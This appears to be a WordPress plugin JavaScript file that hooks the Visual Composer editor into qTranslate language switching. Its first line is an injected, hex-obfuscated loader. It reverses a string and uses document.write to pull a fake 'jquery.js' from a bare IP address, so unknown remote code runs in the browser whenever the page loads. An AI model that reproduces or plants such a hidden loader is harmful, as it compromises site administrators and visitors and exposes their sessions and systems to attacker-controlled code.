var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))(function ( $ ) {
	$( '#content-html' ).on( 'click', function () {
		window.setTimeout( function () {
			window.wpActiveEditor = 'qtrans_textarea_content';
		}, 10 );
	} );

	$( window ).ready( function () {
		var activeLang = qtrans_get_active_language(),
			$langs = $( '#vc_vendor_qtranslate_langs' );

		$( 'option', $langs ).each( function () {
			var $el = $( this );
			if ( $el.val() == activeLang ) {
				$el.prop( 'selected', true );
			}
			$( '#qtrans_select_' + $el.val() ).on( 'click', function () {
				$el.prop( 'selected', true );
			} );
		} );

		$langs.on( 'change', function () {
			$( '#qtrans_select_' + $( this ).val() ).trigger( 'click' );
			var link = $( ":selected", this ).attr( 'link' );
			$( '.wpb_switch-to-front-composer' ).each( function () {
				$( this ).attr( 'href', link );
			} );
			$( '#wpb-edit-inline' ).attr( 'href', link );
			vc.shortcodes.fetch( { reset: true } );
		} );

		$langs.show();

		if ( ! window.vc ) {
			window.vc = {};
		}
		vc.QtransResetContent = function () {
			$( '#content-html' ).trigger( 'click' );
			$( '#qtrans_textarea_content' ).css( 'minHeight', '300px' );
			window.wpActiveEditor = 'qtrans_textarea_content';
		};

		vc.Storage.prototype.getContent = function () {
			var content;
			vc.QtransResetContent();
			content = $( '#qtrans_textarea_content' ).val();
			if ( vc.gridItemEditor && ! content.length ) {
				content = vcDefaultGridItemContent;
			}
			return content;
		};

		vc.Storage.prototype.setContent = function ( content ) {
			$( '#content-html' ).trigger( 'click' );
			$( '#qtrans_textarea_content' ).val( content );
			vc.QtransResetContent();
		};

	} );
})( window.jQuery );